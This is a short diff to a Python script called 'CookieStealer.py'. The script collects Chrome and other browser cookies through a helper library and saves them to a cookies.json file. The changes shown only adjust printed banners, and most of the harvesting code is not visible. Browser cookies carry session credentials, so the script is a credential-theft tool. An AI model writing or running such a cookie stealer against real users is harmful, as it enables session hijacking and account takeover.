@@ -1,6 +1,10 @@
 import lib_bc
 import json
 
+print(""" 
+***   RUNNING 'CookieStealer.py'   ***
+""")
+
 try:
     print("[!]Getting chrome cookies...")
     chrome = lib_bc.chrome()
@@ -79,5 +83,5 @@ with open('cookies.json', 'w') as f:
     f.write(json.dumps(cookie_list))
 print("\t\t[+]Cookie list saved to the 'cookies.json' file!")
 
-print("***  COOKIES ARE SAVED TO 'cookies.json' FILE    ***")
+print("\n***  COOKIES ARE SAVED TO 'cookies.json' FILE    ***")
 print("***  EXITING PYTHON  ***")
